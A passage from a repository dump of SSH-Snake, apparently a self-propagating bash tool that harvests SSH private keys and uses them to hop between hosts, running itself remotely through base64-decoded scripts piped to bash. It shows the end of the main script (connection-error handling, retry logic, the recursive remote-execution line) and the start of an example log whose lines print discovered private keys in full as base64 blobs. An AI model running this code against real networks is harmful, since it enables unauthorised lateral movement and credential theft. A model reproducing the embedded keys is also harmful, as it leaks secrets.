command: cmd\n        if [[ \"$line\" == \"Invalid command: \"* || \"$line\" == \"exec request failed on channel \"* ]]; then # Github\n          double_rs_chained_print \"$t_hosts_chain\" \"$t_hostnames_chain\" \"$ssh_dest\"\n          rs_chained_print \"$t_hosts_chain\" \"$ssh_dest [GitHub]\"\n          break\n        fi\n\n        # SSH may sporadically fail due to connection issues in various ways. Looking at the source for openssh and using all of the servers that reported errors, I've determined that the following errors may occur when a connection to a server is broken one way or another.\n        # When any of these errors occur naturally, we retry the destination (and the key which is associated with this destination).\n        #\n        # Write failed: Broken pipe\n        # Timeout, server [host] not responding\n        # Connection to host closed by remote host\n        # Read from remote host [host]: [error]\n        # Connection closed by [host] XXX: This may mean it's vulnerable to https://joshua.hu/ssh-username-enumeration-ubuntu-18\n        # Connection closed by [host] port 22 XXX: This may mean it's vulnerable to https://joshua.hu/ssh-username-enumeration-ubuntu-18\n        # ssh_exchange_identification: read: Connection reset by peer\n        # Connection from/to ip [host] timed out\n        # Disconnected from [host]\n        # Connection reset by [host]/peer, kex_exchange_identification: read: Connection reset by peer\n        # Connection to [host] closed by remote host. XXX: This may mean it's vulnerable to https://joshua.hu/ssh-username-enumeration-ubuntu-18\n        # Connection to [host] timed out while waiting to read\n        # kex_exchange_identification: Connection closed by remote host\n        # ssh_exchange_identification: Connection closed by remote host\n        # Connection timed out during banner exchange\n        # Connection to [host] port [port] timed out\n        # Bad remote protocol version identification\n        # Protocol major versions differ\n        if [[ \"$line\" == *\"Broken pipe\"* || \"$line\" == *\"Timeout, server\"* || \"$line\" == \"Connection to\"* || \"$line\" == \"Read from remote host\"* || \"$line\" == *\"Connection closed by\"* || \"$line\" == *\" timed out\"* || \"$line\" == *\"Disconnected from\"* || \"$line\" == *\"Connection reset by\"* || \"$line\" == *\"closed by remote host\"* || \"$line\" == *\"kex_exchange_identification\"* || \"$line\" == *\"ssh_exchange_identification\"* || \"$line\" == *\"Bad remote protocol version identification\"* || \"$line\" == *\"Protocol major versions differ\"* ]]; then\n          if [[ \"$line_num\" -le 3 ]]; then\n            # If we receive one of these errors within the first three lines of the connection being made, it most likely means there is something fatally wrong with the server.\n            # This could be a server vulnerable to https://joshua.hu/ssh-username-enumeration-ubuntu-18, or some other error where the connection was never established in the first place, and is never going to be.\n            # If the error message is not that of a possibly vulnerable server, then add the host to _ignored_hosts.\n            if [[ \"$line\" != \"Connection closed by\"* && \"$line\" != \"Connection to\"* && \"$line\" != *\"closed by remote host.\" ]]; then\n              _ignored_hosts[\"$ssh_host\"]=1\n            fi\n            # Either way, skip this destination because it's never going to work.\n            skip_this_dest=1\n            break\n          fi\n          # Otherwise, we retry the destination.\n          retry_keys[\"$priv_key\"]=\"$key_file\"\n          retry_dests[\"$ssh_dest\"]=1\n          rs_chained_print \"$t_hosts_chain\" \"$ssh_dest [ConnErr]\"\n          break\n        fi\n\n        # Some AWS servers (EC2?) restrict ssh to certain users. We can grab the correct user and attempt to SSH in it when we perform our retries.\n        #\n        # Please login as the user \"ubuntu\" rather than the user \"root\".\n        if [[ \"$line\" == \"Please login as the user\"* ]]; then # AWS\n          local aws_ssh_user\n\n          double_rs_chained_print \"$t_hosts_chain\" \"$t_hostnames_chain\" \"$ssh_dest\"\n\n          aws_ssh_user=\"${line#*\\\"}\"\n          aws_ssh_user=\"${aws_ssh_user%%\\\"*}\"\n          if is_ssh_dest \"$aws_ssh_user@$ssh_host\"; then\n            rs_chained_print \"$t_hosts_chain\" \"$ssh_dest [fail,aws,$aws_ssh_user]\"\n            if [[ ! -v 'ssh_dests[\"$aws_ssh_user@$ssh_host\"]' || ${#ssh_dests[\"$aws_ssh_user@$ssh_host\"]} -eq 0 ]]; then\n              retry_dests[\"$aws_ssh_user@$ssh_host\"]=1\n              retry_keys[\"$priv_key\"]=\"$key_file\"\n            fi\n          else\n            rs_chained_print \"$t_hosts_chain\" \"$ssh_dest [fail,aws,$line]\"\n          fi\n          break\n        fi\n\n        # Eventually, we have no special cases left.\n        # If the line contains the chain, then it means the line has also been \"dealt with\" (i.e. it is an expected output) from the remote destination. For example: [00000]     user@host[key]->user@host2[key2]->user@host3: something.\n        # Since it contains \"user@host[key]->user@host2[key2]->user@host3\", that means the remote destination printed it from the script.\n        # So, just pass it down to other destinations down the chain.\n        if [[ \"$line\" == *\"$t_hosts_chain\"* || \"$line\" == *\"$t_hostnames_chain\"* ]]; then # Includes a chain, so just print it.\n          printf \"%s\\n\" \"$line\"\n        else\n          # If the line doesn't contain the chain, then it's an unexpected output. So, print the chain including the destination, and the line.\n          rs_chained_print \"$t_hosts_chain\" \"$ssh_dest [line]: $line\" # Doesn't include a chain, so the message is coming from something we didn't expect, so print it with [line].\n        fi\n      done < <(${s} ssh \"${ssh_options[@]}\" -i \"$key_file\" -- \"$ssh_dest\" \"echo 'printf \\\"%s\\\" \\$1 | base64 -d | bash --noprofile --norc -s \\$1 \\$2 \\$3 \\$4 \\$5' | bash --noprofile --norc -s -- '$script' '$(printf \"%s\" \"$t_hosts_chain\" | base64 | tr -d '\\n')' '$ignore_list' '$ssh_dest' '$(printf \"%s\" \"$t_hostnames_chain\" | base64 | tr -d '\\n')'\" </dev/null 2>&1 | tr -d '\\r')\n      [[ $skip_this_dest -eq 1 ]] && break\n\n    done\n  done\n\n  if [[ $use_find_from_ignore_list -eq 2 ]]; then\n    local ssh_dest\n\n    # Re-load the new ignore_list into the ignore_list_array array.\n    load_ignore_list_array\n\n    for ssh_dest in \"${!ignore_list_array[@]}\"; do\n      [[ -z \"$ssh_dest\" ]] && continue\n      [[ -v 'ssh_dests[\"$ssh_dest\"]' || ${#ssh_dests[\"$ssh_dest\"]} -gt 0 ]] && continue # Don't bother scanning if it's already been scanned\n      retry_dests[\"$ssh_dest\"]=1\n    done\n    for priv_key in \"${!priv_keys[@]}\"; do\n      key_file=\"${priv_keys[\"$priv_key\"]}\"\n      retry_keys[\"$priv_key\"]=\"$key_file\"\n    done\n  fi\n\n  # Do we have some dests to retry? (AWS or connection errors)\n  (( ${#retry_dests[@]} )) || return\n  (( ${#retry_keys[@]} )) || return\n  # Have we already tried too many times?\n  [[ $retry_count -gt 0 ]] || return\n\n  ((retry_count--))\n\n  ssh_dests=()\n  priv_keys=()\n\n  for ssh_dest in \"${!retry_dests[@]}\"; do\n    # add_ssh_dest is null-op'd here, so add it manually.\n    is_ssh_dest \"$ssh_dest\" && ssh_dests[\"$ssh_dest\"]=1\n  done\n\n  for priv_key in \"${!retry_keys[@]}\"; do\n    [[ -v '_ignored_key_files[\"$priv_key\"]' || ${#_ignored_key_files[\"$priv_key\"]} -gt 0 ]] && continue\n    priv_keys[\"$priv_key\"]=\"${retry_keys[\"$priv_key\"]}\"\n  done\n\n\n  (( ${#ssh_dests[@]} )) || return\n  (( ${#priv_keys[@]} )) || return\n  # priv_keys maybe empty, add_ssh_dest could be newly ignored.\n\n  printf \"%s%s: EXTERNAL_MSG: INFO: Trying again with %d dests and %s keys (attempts left: %d)\\n\" \"$indent\" \"$hosts_chain\" \"${#ssh_dests[@]}\" \"${#priv_keys[@]}\" \"$retry_count\"\n  recursive_scan\n}\n\nsetup\n\nexec_custom_cmds\n\nfind_all\n\ncombinate_users_hosts_aggressive\ncombinate_interesting_users_hosts\n\ndeduplicate_resolved_hosts_keys\n\n(( ${#ssh_dests[@]} )) || fin\n(( ${#priv_keys[@]} )) || fin\n\nprintf \"%s%s: EXTERNAL_MSG: INFO: Beginning with %d dests and %d keys\\n\" \"$indent\" \"$hosts_chain\" \"${#ssh_dests[@]}\" \"${#priv_keys[@]}\"\n\nrecursive_scan\n\nfin\nMAIN_SCRIPT\n)\nprintf \"%s\" \"$THIS_SCRIPT\" | bash --noprofile --norc\n"
        },
        {
          "name": "example-output.log",
          "type": "blob",
          "size": 216.96484375,
          "content": "                      __    __    __    __\n                     /  \\  /  \\  /  \\  /  \\\n____________________/  __\\/  __\\/  __\\/  __\\_______________________________,\n___________________/  /__/  /__/  /__/  /__________________________________|\n                   | / \\   / \\   / \\   / \\  \\____                          |\n                   |/   \\_/   \\_/   \\_/   \\    o \\                         |\n                                           \\_____/--<                      |\n       ---_ ......._-_--.                                                  |\n      (|\\ /      / /| \\  \\                                      ?          |\n      /  /     .'  -=-'   `.                                  .            |\n     /  /    .'             )                                '             |\n   _/  /   .'        _.)   /                  _ -- ~~~ -- _      _______   |\n  / o   o        _.-' /  .'               .-~               ~-.{__-----. : |\n  \\          _.-'    / .'*|             /                       \\      | | |\n   \\______.-'//    .'.' \\*|            :         O     O         :     | | |\n    \\|  \\ | //   .'.' _ |*|            /\\                       /------' j |\n     `   \\|//  .'.'_ _ _|*|           { {/~-.               .-~\\~~~~~~~~~  |\n      .  .// .'.' | _ _ \\*|            \\/ /  |~:- .___. -.~\\  \\ \\          |\n      \\`-|\\_/ /    \\ _ _ \\*\\          / /\\ \\ | | { { \\ \\  } }  \\ \\         |\n       `/'\\__/      \\ _ _ \\*\\        { {   \\ \\ |  \\ \\  \\ \\ /    } }        |\n      /^|            \\ _ _ \\*         \\ \\   /\\ \\   \\ \\  /\\ \\   { {         |\n     '  `             \\ _ _ \\          } } { { \\ \\  \\ \\/ / \\ \\  \\ \\        |\n                       \\_             / /   } }  \\ \\ }{ {    \\ \\ } }       |\n ___________________________         / /   { {     \\ \\{\\ \\    } { {        |\n( Written for the mediocre. )       / /     } }     } }\\\\ \\  / / \\ \\       |\n(          By the mediocre. )      `-'     { {     `-'\\ \\`-'/ /   `-'      |\n----------------------------               `-'        `-' `-'              |\n                ^__^   o                                                   |\n        _______\\)xx(  o      <https://github.com/MegaManSec/SSH-Snake>     |\n    \\/\\)       \\)__(      By Joshua Rogers <https://joshua.hu/>            |\n       | w----||  U                                                        |\n       ||     ||                                  GPL 3, of course.        |\n________________________~_____/^,___,-^\\_________________~~_______________/`\n\n\n\n|-----------------------------------------|------------------------------|\n| Setting                                 | Value                        |\n|-----------------------------------------|------------------------------|\n| ignore_user                             | 0                            |\n| use_sudo                                | 1                            |\n| ssh_timeout                             | 1                            |\n| retry_count                             | 3                            |\n| scan_paths                              |                              |\n| scan_paths_depth                        | 3                            |\n| interesting_users                       | jrogers root                 |\n| interesting_hosts                       | 127.0.0.1                    |\n| interesting_dests                       |                              |\n| ignored_users                           |                              |\n| ignored_hosts                           |                              |\n| ignored_dests                           |                              |\n| ignored_key_files                       | *badcert.pem* *badkey.pem*   |\n| custom_cmds                             |                              |\n| use_combinate_interesting_users_hosts   | 1                            |\n| use_combinate_users_hosts_aggressive    | 0                            |\n| use_find_from_hosts                     | 0                            |\n| use_find_from_last                      | 0                            |\n| use_find_from_authorized_keys           | 0                            |\n| use_find_from_known_hosts               | 0                            |\n| use_find_from_ssh_config                | 0                            |\n| use_find_from_bash_history              | 0                            |\n| use_find_arp_neighbours                 | 0                            |\n| use_find_d_block                        | 1                            |\n| use_find_from_hashed_known_hosts        | 0                            |\n| use_find_from_prev_dest                 | 0                            |\n| use_find_from_ignore_list               | 0                            |\n| use_retry_all_dests                     | 1                            |\n|-----------------------------------------|------------------------------|\n\n\n[1704020277]jrogers@10.128.0.25\n[1704020277]jrogers@(10.128.0.25)\n[1704020277]jrogers@10.128.0.25: Discovered usable private key [3072 MD5:b2:45:a5:03:54:c7:71:29:c1:0d:f5:c5:e8:27:63:5f jrogers@instance-3 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020277]jrogers@10.128.0.25: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUFua1JURStqRURCZU5sM25WRVIyTk9udUU4ZUIzSHdxeDhCMWphamdDZmk3NERIZlYvc3hZCnlkNjBybTRYbHFzWk8weFM3YW5vVTM5RmFhZ1llL2R6RG1ZWDY3Y0V0V0hsVUJQVGh0OEhYUjFUMlBYaGZLZTBsUHA3Sk8KS0ZFTjFqMmRYaEhsd0g2dlhMc1RwS3lUdzBYR2FoRmhoNHl1VWlkTi9RRlQ2aDgwRlArZ1c0N1J4U1hGTUlQRE9McWJrSwpVNU0zRER4ZUlaaDgzT0UzcDlRSHBzS2VIamZaNWYzaDBtbFFLY05vOGE3eHI1OVRCcGFhMkwxc05KbXZNTzNVb3QzeG9VCnRnU0dLNldValNOQjcxeldNN1lyUFIwd3JzSHBObGpFUkdIV05DR1lTU0NtVUdNclhOUjk2N1VKYjZ3Yk9KUitEUk1vUzcKUEY2VHdXek5VY2lIcXN3a1FMZUFGM1FObWFKWXBHUXFLbkVoN0ZMRkExdklEWjVSeWhoTnZGSkVoMUt2bWxQMzVJS3l6ZgppTkdXRjZHTCsrYVVtUlJpY2xuU3AyMTcxaTB5djJicm92L0tOMmlXYXEvQStOZjBGaFlYZDJ4RzlCK1RFbHFOT0xyRnRtClc3ZVkySFFtWlBPb3VRQlJ4Zms0Nm96QzczMTJJOHhjQUFFdnpFMnZBQUFGaUd3cTRxTnNLdUtqQUFBQUIzTnphQzF5YzIKRUFBQUdCQUo1RVV4UG94QXdYalpkNTFSRWRqVHA3aFBIZ2R4OEtzZkFkWTJvNEFuNHUrQXgzMWY3TVdNbmV0SzV1RjVhcgpHVHRNVXUycDZGTi9SV21vR0h2M2N3NW1GK3UzQkxWaDVWQVQwNGJmQjEwZFU5ajE0WHludEpUNmV5VGloUkRkWTluVjRSCjVjQityMXk3RTZTc2s4TkZ4bW9SWVllTXJsSW5UZjBCVStvZk5CVC9vRnVPMGNVbHhUQ0R3emk2bTVDbE9UTnd3OFhpR1kKZk56aE42ZlVCNmJDbmg0MzJlWDk0ZEpwVUNuRGFQR3U4YStmVXdhV210aTliRFNacnpEdDFLTGQ4YUZMWUVoaXVsbEkwagpRZTljMWpPMkt6MGRNSzdCNlRaWXhFUmgxalFobUVrZ3BsQmpLMXpVZmV1MUNXK3NHemlVZmcwVEtFdXp4ZWs4RnN6VkhJCmg2ck1KRUMzZ0JkMERabWlXS1JrS2lweElleFN4UU5ieUEyZVVjb1lUYnhTUklkU3I1cFQ5K1NDc3MzNGpSbGhlaGkvdm0KbEprVVluSlowcWR0ZTlZdE1yOW02NkwveWpkb2xtcXZ3UGpYOUJZV0YzZHNSdlFma3hKYWpUaTZ4YlpsdTNtTmgwSm1UegpxTGtBVWNYNU9PcU13dTk5ZGlQTVhBQUJMOHhOcndBQUFBTUJBQUVBQUFHQWRTRHZzdzVTK1BmOWJCdFlXb0JhWXV2REtoCmNMVWNmaWhHZmJpV0xHUllpUlB2ajVRTWNPOXVlQkpJNkptcElwN0Q3Q0tPM1Q2T2VLQVhYTUdRSzYvZThFeVFmN3poa1QKVXI0NWo5bERZK0F1aTZUOUtmb2JwUjN6UVFyN204MmM5anhaak5SamI3cFU4MmJHcmtPR0pOUTNaMWpaSEorVGJwZXRNZQp2V2cyYlV2NTY0aTVLb1NYZVI0cXZyTXNLbEo5RU5ybHFHOTZvWXpvZEhYMGVHR2g1eVVyN1czbVdVV05wajMyU2xLQ2htCjZhaXFFM2dtUlQxNjlUcS84eUF2VWdUcDRGUjFZU09WY1V1RHVHSjF5aWc4cUFmUVdIMnN6THhRa1R4dkhXTjlOTU9zczkKKzloSmJjZjRDN0p3VXRaQTUwQVBXdnpWZnVyakh0VEVBQ1ZNOE83MDZ3NFlkY2pSNzVhbk5tamlINXRhSWhKU0w5YStBYwoxOXBJUmJEUzRCRldHS2wwSk1LU3NwdjF3eXVmZDZ4cGhlZE12cnNieE1OeFVBdU9vTzBXRXVXRDFDT29QbEx0M09IUGVFClpwWTRnUFpwQkFwakR4QmZ6cS9QdWtGOC84QWt5eXdSY1pEUU4yVGtWdjdkWmlKS2s2Y1EwWjA5YVoxSEpONGlVUkFBQUEKd0hOdEx5eUU0aEJUZk5ZS2EyNldyay92cWQ1UlZiMktvZm9wT2lrV1R5Y25vOUp0L1llN0FRWGc4Yks3UzBNeVpCbzdkSApVMnRDL1B5Tzl5NjQyMEZoYVg0NURLZnlYckRBNk44UU1WVmtHd25zaWFDUERKUkhVUUwvVTRjZ1pUOVB2SUI5enVNMUM4CkVObzhYMmhBalVYa1ljWmdTYUM4Y2F1TjhWSk4wMFVBa0xxbHE3TTdKYmhHS2phUm54ejN2R0Z2S2RnZ3hPdHpqNTVpeWcKRGJmOGF1TGI4Q2w4TWZVNGdWRkxjZ2lOaER0UXFrRWxnd29GeXVwKzhJckdLU1hBQUFBTUVBenVSUlY3RURiS0VaWGhsQQpGQ3g4Q1oxWjlWS1pBU3BVS3VrUzNVb3Y0enhrTENaWjR4RzUvZUtjeVAvdUkzMVgrclJsMFRncUlkMjZzOG1KSHFTTE9WCkNiSzBFcG9XY0lUamttK0szZHVwWXJvVUNKeExWeHdMdVR6U09DbUtoWDNTV0JQK2lMR1hsV0hzekdyeG9wSWQ5SkcrbWMKWm9TWVAzYVJXTDlWUG9uSFc2WjhoL0VjSkxmVEVxM21OeUZTdU5CakdudXl6dVpyeHJqUER1ZGhvckEyRExFNVpMZHJ1VApuaVBjREtFWFBlL25lcnh1bUtlWTFxSmdkVm5RVmJBQUFBd1FERDFWV1FUcHpNd3VuamdNa01zUXdIY3ZUeHcyOTZnM2hOClRhSFF6ZkJNcDExODREWkc2RXJDSm5aS3JIU0dwYThFSGtURmlXOEc1bGJzNG5iQWtLMG5KUmNVaStyaHU2cVhQNml3Qm0KandQYjVsNldDdmVSVW5OckRBcmZ4SGNQM3hUelVBYW1HUitQYURBejY2V3U0UlR3ZUZYZW9vVHV0ZDg3ZDBPU1RPRkZXWQpWUnFCb0tKcW5Weml0Qm5VeVdhS3IyMjgweXVUdTUzU1lHOEtIeXFab25oZFFFSURCS2lwUmgvYzNRSGwwOXU2SWlueWVyCmZXNENGT2tiazV4VDBBQUFBU2FuSnZaMlZ5YzBCcGJuTjBZVzVqWlMwekFRPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020278]jrogers@10.128.0.25: Discovered unusable private key in [/home/jrogers/.ssh/protected]\n[1704020278]jrogers@10.128.0.25: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/protected]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQ21GbGN6STFOaTFqZEhJQUFBQUdZbU55ZVhCMEFBQUFHQUFBQUJEdUlHSGd4RAp5MEh0WW9QUmUwK1VBUEFBQUFFQUFBQUFFQUFBR1hBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FEQXIvWWZCRWpnCmE0QnMycnJWWUhSVk1ramxEcHU0T2hDMEJBcWVRYlZYd0l0czNRb09vSkZmMGErSFNDRG5DR0FUblY1SHpkYUR0eENRbVIKMmdzdlczY29CT0tZbThBMTJkLzFxSGZFUG0rNkxoaTFjek44clp0QlV5WDRCLzRqQmFsMWJzLzczSnFRQmZYMmZEbHBJRQpJUmJGbUtqWnNqN1FIOEppRnBlYzIrbmJ2bG1SSWVPeHlPd3ZvUlJzeGcvUU1tdGR0VUp3ZHJNL2pQVVBVQlRBdllrWTFiCk9yVXJYaHdZbDJJVVFmUjY4bTU0VnU5MWpPUHY0VStjWkFJR1FEaWNQYjlodUFEeUxxR2dnQVp6eVJNak1pUkp5RFlnM3AKT3ZyNThBa3p0SHdwSUJiTEhhSzVrZ04xN0RwbFZsc2t0NEpXVFFLanZqWVJJWmp1VzUyTFJJT0JqMjAxZk1LVmhENzdwYgpoekZNbDZkdHY0cE5qU2gxYUhoMGtRRy9ldTcxeUxpLzduWTZuU2prNFd0MWNONHRKQWJ0ZnRCdmJTai80Y2RabFl5cis4CitDWW1TQTJhSlVITTFxRTlvRTV1VGhZa1RnMW91ais0NWRYcUhsU2gvaWFwT0h3Rk45WWY1RnY2ZFpSc0p1UzJmcEo5UjIKVlNlQkJVdC9LSm1SRUFBQVdROGlEUGlWbWRtUW9oSjVELzF4VWlwOG1qeUt5ZXc3eEdMODdqdG9yaEgxcGJCQlc3OHBJLwpxVWNrMFJjNmN4MmZuM0dGSmFtcVJKWTcza3h6a29jVTNVRFV4MWIvc0NJTUZLcGpVSTA5WVFueWRZdjZtN21nWk5nV0FFCktSN283eW5kTVErbnZmNk1WQWtKQ2Rha0daOC8rSTI0ck9xaHUzdHpOQzFZVG5xSTZteW9zRXJ2QUw4WEZQVmpEZld3Uy8Kd2NQeXp0b0lsV1lXWUc0cUh6NXBmM3ZobnI3bE9SWHR5WW93Z2pvc09sWFYvb0xaWWUwQXJzRHJvOW1OaFZGRlQwSTR5SQpDRTE5VmtKekJhZXpkMU9RRTdIcHQwcjhPdkZQWkJDalBsMTFKbzVQcHpmbjlnenZTMTd5M0RURWZvcXpFT25yaHVYWEF4CjJURjdWUGptSGdWQldIaDgyb3Z0c1o3YjZYZTVEV0ozSXBHSEtTNFUxSlc5dTZiRVFRRHEwbmJyVU9mMTIyTWFYYmt4TlkKL3JDZGlkTzBESElWejZvOWgyNkVQMlJrTlpwTlI4MFROT2RjYWFYV25XdytyWkl3eTZMelByeEdkbVpWUVZibW9oVXh0MQp3MEJjWW53dlVYcXN2aFpCaWxMUCs2cFFLKy9lMkVTdE80K255ZU91dFhBK01JMnRsRXVnYVZEU0x4UGpxWU9yZEpQaEJvCm5BNGlxbFltVDlTY2V6REp2VFhkaEJwZXltMmFtM0VXRTVPVjlRdElpNEZHOWEzU2lUdCs4K084TDl3enpUZjlyTVZjeGwKVGtZYzFjU0cwdEVId3RmOUFSZVBDZWVmK0dVcW92SldYMWMzZEpvWGl4aG9XRW1aUmVEZzlHOGF1WnlNd1RuZzNlR25LWAorV0w3cjRuNmtUTkVKTEdYS0hSdXgxa0tuRWx0MWN4bDNaSXROZ1RwTDd1YStMbXFHcThhby9SYzB4SHRjYXJId1VtczBPCmUxenU0YzRyK1RwemhuTmpqRzBZY0p3ek9mR21xcnc2dTdIVm5SSE9HbXVSNm5XcER3VnVCZVNtb1pmamViN1Vnb2pRbkIKSE9RSGNmQkk3d0NicmYyUVN4Nkxra2tyVVUyWXp5WGM2dGdEemhMWFZyNHVMaWxucHJnUjdwcXJSWTdvd1pmQ2Q4endlbApzWnFVVmdrTklSelArY2xZb1JMQjIwUG5sWEU4cTdVcHUrdnI2QUk2Tk5BZmJVNTNWZnkvZkovN0svSk9CK1dsanhnV3IxCjJEZ1ZVSTU4OUFCN2RkbUJveEl2aGM3YVkwMU9ielRvNTJ6RERRTkJkdXlPR2ZzZzFnQzFTZW9YbU4weDFuK3Fza1pFQWcKbVBodVEydFU2R1pWUDgzT1lJYnpyUE0yWFNrdXY3QmdJSmxvdSsyTHlaYjdLcWR0Mms1R3VLalhIOHVkUDVIN2VGUmdHUwpqN0lLVzJoL0xFUXYvOUovYmxhNTB5TXlaWnNvVVh4dlREbDhxMGdTN3AzeWZrRnpkUFZHTENSNmhlMUJQQitVSE1wUHlLClF4YnA3bzdhWGhlRm5CQy9URTdUYzgydytJNnlXZnRKUHVxazNQUFlrWEdHaTNLamE0UC9GdWxHZXpoVTUvb0pGajNVVFoKUDNBZzhHWmZ5cEpxZjFCSkhCbzBzUzBJcXN4U0srcjY3M01BTllBckpzZVVIc1IyTVhuNGlwdTQwaVJpWmFMcG5ZRHV1MwpmUzZsSEl2RVNVditjRG9oQm41MGNmalI4a3h6YlUxQ1Y2NUpmSHdUZk1jaGFHMDJ3R3p5cmJPbzNXN05kbkJSNDVtK3BVCi8yZWFYdXZkNk5Ma241SlFENmo0L2FvM1lEZ1RNaURrdlpZZU9WeEpxVjMyMjBWcUV2ZXFsMnpkSnFQSnFLTzVLU1pKSEgKaXFTcEVPSjFZa3VObExENXpaaXk1WEJ0eEJTWGU0RmRZYzlFNFlyTUhHbWNlMWcrallSelFqeWRVUUVlZjNybzF5ZzFzeQpZZ3puemlMMEtrUGtrL3pySGlEaWNhaHgwdU95NWlsaFhXQzYwcG9OZ0EyNzZqcldxNVB4MHhXTng2VFFNM2IvZHIzWGt3Ckh0S2poYW5sb2xiUWN3SGQ3VDUzRWdmZUUvU2NWbE9ZcEgyUmhlaGt6QTkwUnNiNVFFdjh6Q1AvQnhPWTludnlpK1V5cjEKa0d6QVdMOHVZdlpha3hJazkzTTlCU2tvL3VvVkpOUmlhNEhLZ2k3VnVuYWhRWU5vMStqL2Y1R1NUTWg0aVg1cDUzZGVWOApSNTRSL2kwZUN5WTd1VHJBRGJreVRtWnRIenJFbWxFeFEvaUpRdE1Ba2tFU3pFS3lRcG5hSXhzbnlTend6ZzFHbDBwMzZ1CkZmSk9mZm5kVXphZDJBWjR2K0lGVENMcFdrcEFPTDZJUTRPUWloNHRvaHIrT2laeWFLWWJKQnRJNmhld1JGbjgrUS9zQy8KdDVrQ09YdjJQUUdMNjNMUWFHVEUycVFPNi9VPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K\n[1704020278]jrogers@10.128.0.25: EXTERNAL_MSG: INFO: Beginning with 12 dests and 1 keys\n[1704020279] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.25\n[1704020279] jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.25)\n[1704020279] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27\n[1704020279] jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)\n[1704020280] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27: Discovered usable private key [3072 MD5:5f:15:03:e3:c6:5e:7d:db:2d:b6:ea:a1:56:91:a8:ee jrogers@instance-5 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020280] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUEyLzVwbE1pVm4yaWVlaEVrUVFZSDBXTGo4anVpTTZiZmR3TDYzVEpucGdlU0dEcEZXYUxWCnJxdktSSjhZNEhRdTVJTXRHcFkvWG1XSVNOT2ZIOVpUcU1majZHdVRSK0dRcU01NzFSaTJ1RmJZY0t6SUhmK29PODNEWVUKeUVBdjZXSm1Xd3EwcndQcUxPUXpWRWRNQVVXRTVsNUpBalpSZFd5RXBaUkFqTlRubFZlbkc2QmVQZGgwZlZTRkxlMnVReApPSGdxOE9lRkdQL2gxS212REpocHo5YlZtc1ExM3dUSDN0ajh0RTVwK1RqRjFNMm52LzZhZlBLVlIrenBwZ1lUWkFnMVlLCmI3bDQ4UzhDYVpTMkZiRmJIL2FwRjZ3WHZYOENWbWlqTVJ6amQ1c0hvdi9tT29SM25WN0lIbVhBTWw5Sy9wWHRVY2FPQmwKYTJFZGpqblI3Z09CZFZBbXBvdEE0WG8yc3lnYnNHbVQzd29FOUJaSHVzSGZYL3VZemtmYlE5V1F1U1FDNnBkVXNwTG5IMApCM21pdS9sT0FIZ3ltZHg4VThXK1paQlpObW5PK3NFK0pTeGJwKzhET2YxT0w2ZXJLYUpuZGszVnZ6QlNhVmh0dTFwZnFrClYzUnoxUTFCS2ZqeWx6eDJodSs0VkRGUE1CRWpVTmk5bmI3eHE1T2pBQUFGa0t6aVd2MnM0bHI5QUFBQUIzTnphQzF5YzIKRUFBQUdCQU52K2FaVElsWjlvbm5vUkpFRUdCOUZpNC9JN29qT20zM2NDK3QweVo2WUhraGc2UlZtaTFhNnJ5a1NmR09CMApMdVNETFJxV1AxNWxpRWpUbngvV1U2akg0K2hyazBmaGtLak9lOVVZdHJoVzJIQ3N5QjMvcUR2TncyRk1oQUwrbGlabHNLCnRLOEQ2aXprTTFSSFRBRkZoT1plU1FJMlVYVnNoS1dVUUl6VTU1VlhweHVnWGozWWRIMVVoUzN0cmtNVGg0S3ZEbmhSai8KNGRTcHJ3eVlhYy9XMVpyRU5kOEV4OTdZL0xST2FmazR4ZFROcDcvK21uenlsVWZzNmFZR0UyUUlOV0NtKzVlUEV2QW1tVQp0aFd4V3gvMnFSZXNGNzEvQWxab296RWM0M2ViQjZMLzVqcUVkNTFleUI1bHdESmZTdjZWN1ZIR2pnWld0aEhZNDUwZTRECmdYVlFKcWFMUU9GNk5yTW9HN0Jwazk4S0JQUVdSN3JCMzEvN21NNUgyMFBWa0xra0F1cVhWTEtTNXg5QWQ1b3J2NVRnQjQKTXBuY2ZGUEZ2bVdRV1RacHp2ckJQaVVzVzZmdkF6bjlUaStucXltaVozWk4xYjh3VW1sWWJidGFYNnBGZDBjOVVOUVNuNAo4cGM4ZG9idnVGUXhUekFSSTFEWXZaMis4YXVUb3dBQUFBTUJBQUVBQUFHQkFOcEQyb0R4V2ZHa25NZERScEwwNXNESnVwCnJVcTZOUGh4ck83QktXTmR1Mld5NktjYy96RE1xV1NzSTJqem55UzZ3UXNhbFZORjMxb25lTzdxdHB1K3NURjMyN2JZNjkKcndhc2hwUHdSeWt4a09DSnJLcUd3bVZEU3Z1NExLbkQ2VGtEWDNzemlKUzhkcVNicnVXZXhSQ3dCOHZ6YmdxWVUxTzQ0RQpQdDc3UlNFWXJBVnU0TkcvZGlQNnZYL0o5MEU1bVJNQmwvdXN